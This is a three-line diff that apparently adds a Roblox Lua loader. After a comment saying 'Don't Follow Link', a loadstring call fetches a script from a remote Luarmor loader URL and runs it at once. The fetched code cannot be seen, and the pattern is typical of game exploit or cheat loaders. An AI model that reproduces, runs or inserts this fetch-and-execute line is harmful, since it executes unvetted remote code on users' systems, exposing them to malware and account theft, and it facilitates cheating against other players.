@@ -1,0 +1,3 @@
+--Don't Follow Link
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/be5a6b1091866143648277e01680d4d7.lua"))()
